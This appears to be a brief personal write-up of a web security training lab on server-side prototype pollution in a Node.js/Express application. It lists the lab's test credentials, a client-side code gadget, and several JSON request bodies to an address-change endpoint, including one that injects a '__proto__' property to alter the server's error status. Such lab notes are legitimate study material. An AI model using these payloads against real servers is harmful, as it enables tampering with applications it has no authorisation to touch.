
# 1 brief

server = Node.js + Express
server-side js object = injectable, unsafely merged
`wiener:peter` accessible
mission
> pollute `Object.prototype` that cause non-destructive change
> > if destructive >>> reset server

---

# 2 gadget

`udpateAddress.js`

this is interesting
```
const [key, value] of Object.entries(responseJson).filter(e => e[0] !== 'isAdmin')
```

`Object.entries()` includes everything not `isAdmin`

# 3 tests + solved

```
POST /my-account/change-address

{"address_line_1":"Wiener HQ","address_line_2":"One Wiener Way","city":"Wienerville","postcode":"BU1 1RP","country":"UK","sessionId":"PKwJ4Hi41mhFgdnqWZZn6DKHbS3QCnuO","pwn":"me"}

{"address_line_1":"Wiener HQ","address_line_2":"One Wiener Way","city":"Wienerville","postcode":"BU1 1RP","country":"UK","sessionId":"PKwJ4Hi41mhFgdnqWZZn6DKHbS3QCnuO""pwn":"me"}

{"address_line_1":"Wiener HQ","address_line_2":"One Wiener Way","city":"Wienerville","postcode":"BU1 1RP","country":"UK","sessionId":"PKwJ4Hi41mhFgdnqWZZn6DKHbS3QCnuO","__proto__":{"pwn":"me"}}

{"address_line_1":"Wiener HQ","address_line_2":"One Wiener Way","city":"Wienerville","postcode":"BU1 1RP","country":"UK","sessionId":"PKwJ4Hi41mhFgdnqWZZn6DKHbS3QCnuO","__proto__":{"status":555}}
```

last one got error 555 with `pwn:me` (from earlier payload?)

---

# end

[...back](../note.md)
